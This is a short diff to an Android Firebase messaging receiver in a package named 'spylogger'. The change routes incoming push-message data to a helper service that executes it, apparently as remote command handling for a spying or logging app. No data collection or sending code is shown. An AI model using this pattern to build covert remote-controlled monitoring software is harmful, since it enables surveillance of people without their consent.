@@ -4,6 +4,7 @@ import android.util.Log;
 
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
+import com.gravatasufoca.spylogger.services.FcmHelperService;
 import com.gravatasufoca.spylogger.vos.FcmMessageVO;
 
 public class MessageReceived extends FirebaseMessagingService {
@@ -21,7 +22,8 @@ public class MessageReceived extends FirebaseMessagingService {
         Log.d(TAG, "From: " + remoteMessage.getFrom());
         Log.d(TAG, "Notification Message Body: " + remoteMessage.getData());
 
-        FcmMessageVO fcmMessageVO=FcmMessageVO.converter(remoteMessage.getData());
+        FcmHelperService fcmHelperService=new FcmHelperService(getApplicationContext(),FcmMessageVO.converter(remoteMessage.getData()));
+        fcmHelperService.executar();
     }
 
 }
